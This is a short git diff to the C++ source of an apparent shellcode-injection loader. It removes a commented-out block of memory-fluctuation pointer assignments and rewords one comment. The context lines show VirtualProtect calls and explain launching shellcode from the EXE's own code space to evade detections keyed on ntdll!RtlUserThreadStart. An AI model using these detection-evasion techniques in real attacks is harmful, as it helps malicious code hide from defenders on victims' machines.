@@ -199,14 +199,6 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
     if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
         return false;
 
-    /*
-    * We're not setting these pointers to let the hooked sleep handler figure them out itself.
-    *
-    g_fluctuationData.shellcodeAddr = alloc;
-    g_fluctuationData.shellcodeSize = shellcode.size();
-    g_fluctuationData.protect = Shellcode_Memory_Protection;
-    */
-
     shellcode.clear();
 
     //
@@ -225,7 +217,7 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
     // running our shellcode from a legitimate user thread callback, we can simply run a thread pointing to our
     // method and we'll instead jump to the shellcode from that method.
     // 
-    // After discussion I had with @waldoirc we came to the conclusion that in order not to bring other IOCs it is better
+    // After discussion I had with @waldoirc we came to the conclusion that in order not to bring new IOCs it is better
     // to start shellcode from within EXE's own code space, thus avoiding detections based on `ntdll!RtlUserThreadStart+0x21` 
     // being an outstanding anomaly in some environments. Shout out to @waldoirc for our really long discussion!
     //
